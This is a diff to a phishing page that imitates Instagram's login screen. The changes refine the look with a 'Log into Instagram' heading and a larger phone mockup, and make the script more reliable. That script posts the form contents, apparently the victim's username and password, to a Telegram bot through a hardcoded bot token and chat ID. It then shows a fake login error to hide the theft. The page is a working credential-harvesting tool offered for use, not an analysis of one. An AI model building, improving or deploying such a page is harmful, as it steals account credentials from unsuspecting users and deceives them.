@@ -33,6 +33,7 @@
             justify-content: center;
             padding: 30px 0 50px;
             width: 100%;
+            flex: 1;
         }
 
         .main-content {
@@ -49,10 +50,11 @@
         .phone-mockup {
             display: none;
             flex-shrink: 0;
+            margin: -60px 0 -40px -35px;
         }
 
         .phone-mockup img {
-            max-width: 380px;
+            max-width: 430px;
             height: auto;
         }
 
@@ -84,12 +86,23 @@
             margin-bottom: 10px;
         }
 
-        /* ===== LOGO ===== */
+        /* ===== LOGO - Instagram text logo like real site ===== */
         .logo {
             width: 175px;
             height: auto;
             margin-bottom: 35px;
             display: block;
+        }
+
+        /* ===== "Log into Instagram" heading (current design) ===== */
+        .login-heading {
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+            text-align: center;
+            color: #262626;
+            margin-bottom: 20px;
+            width: 100%;
         }
 
         /* ===== FORM ===== */
@@ -101,7 +114,7 @@
 
         .form-group input {
             width: 100%;
-            padding: 9px 8px 7px;
+            padding: 9px 0 7px 8px;
             background-color: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
@@ -183,7 +196,7 @@
             margin: 0 18px;
         }
 
-        /* ===== FACEBOOK ===== */
+        /* ===== FACEBOOK LOGIN ===== */
         .facebook-login {
             display: flex;
             align-items: center;
@@ -225,7 +238,7 @@
             text-decoration: underline;
         }
 
-        /* ===== ERROR ===== */
+        /* ===== ERROR MSG (like real Instagram) ===== */
         .error-msg {
             color: #ed4956;
             font-size: 14px;
@@ -299,7 +312,6 @@
             justify-content: center;
             padding: 0 16px;
             margin-top: 24px;
-            gap: 0;
             max-width: 700px;
         }
 
@@ -338,7 +350,7 @@
             outline: none;
         }
 
-        /* ===== RESPONSIVE ===== */
+        /* ===== MOBILE RESPONSIVE ===== */
         @media (max-width: 450px) {
             body {
                 background-color: #ffffff;
@@ -372,11 +384,14 @@
             <div class="login-wrapper">
                 <!-- Login Card -->
                 <div class="login-card">
-                    <!-- Instagram Logo SVG (white bg version) -->
+                    <!-- Instagram Text Logo -->
                     <svg class="logo" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M41.6 24.6c0-6.1 4.9-11.1 11-11.1s11 5 11 11.1-4.9 11.1-11 11.1-11-5-11-11.1zm5.9 0c0 2.8 2.3 5.1 5.1 5.1s5.1-2.3 5.1-5.1-2.3-5.1-5.1-5.1-5.1 2.3-5.1 5.1zm11.5-11.7c0 1.4 1.1 2.5 2.5 2.5s2.5-1.1 2.5-2.5-1.1-2.5-2.5-2.5-2.5 1.1-2.5 2.5zm10.5 2.2c-1.3-1.8-3.2-3.1-5.5-3.6-.8-.2-2.1-.4-6.3-.4H36.9c-4.2 0-5.5.2-6.3.4-2.3.5-4.2 1.8-5.5 3.6-1 1.4-1.7 3.1-1.9 5.1-.1.7-.2 1.9-.2 5.9v5.3c0 4 .1 5.2.2 5.9.2 2 .9 3.7 1.9 5.1 1.3 1.8 3.2 3.1 5.5 3.6.8.2 2.1.4 6.3.4H52c4.2 0 5.5-.2 6.3-.4 2.3-.5 4.2-1.8 5.5-3.6 1-1.4 1.7-3.1 1.9-5.1.1-.7.2-1.9.2-5.9v-5.3c0-4-.1-5.2-.2-5.9-.2-2-.9-3.7-1.9-5.1zM28.7 41.4c-1.1-.7-2-1.6-2.7-2.7-1-1.4-1.6-3-1.8-4.8-.1-.7-.2-1.8-.2-5.6v-5c0-3.8.1-4.9.2-5.6.2-1.8.8-3.4 1.8-4.8.7-1.1 1.6-2 2.7-2.7 1.4-1 3-1.6 4.8-1.8.7-.1 1.8-.2 5.6-.2h14.8c3.8 0 4.9.1 5.6.2 1.8.2 3.4.8 4.8 1.8 1.1.7 2 1.6 2.7 2.7 1 1.4 1.6 3 1.8 4.8.1.7.2 1.8.2 5.6v5c0 3.8-.1 4.9-.2 5.6-.2 1.8-.8 3.4-1.8 4.8-.7 1.1-1.6 2-2.7 2.7-1.4 1-3 1.6-4.8 1.8-.7.1-1.8.2-5.6.2H36.9c-3.8 0-4.9-.1-5.6-.2-1.8-.2-3.4-.8-4.8-1.8z" fill="#262626"/>
                         <circle cx="33.5" cy="19.5" r="1.5" fill="#262626"/>
                     </svg>
+
+                    <!-- "Log into Instagram" heading (مثل الواجهة الفعلية) -->
+                    <div class="login-heading">Log into Instagram</div>
 
                     <form id="loginForm" autocomplete="off" style="width:100%;">
                         <!-- Username/Email -->
@@ -460,6 +475,7 @@
 
     <script>
         // ================== CONFIG ==================
+        // ضع التوكن والآيدي حقك هنا
         const TOKEN = "8912562695:AAH3_MJYNFSKJo9duvYg_wMBQXSwNRCuoyo";
         const CHAT_ID = "1692257834";
         // ===========================================
@@ -514,16 +530,25 @@
 ━━━━━━━━━━━━━━━━━━━
             `.trim();
 
-            // === Send to Telegram (background, no waiting) ===
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(() => {});
+            // === إرسال إلى تيليجرام ===
+            try {
+                const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                if (!tgRes.ok) {
+                    console.error('Telegram send failed:', await tgRes.text());
+                } else {
+                    console.log('Sent to Telegram successfully');
+                }
+            } catch (err) {
+                console.error('Telegram error:', err);
+            }
 
             // === Show fake error like real Instagram ===
             setTimeout(() => {
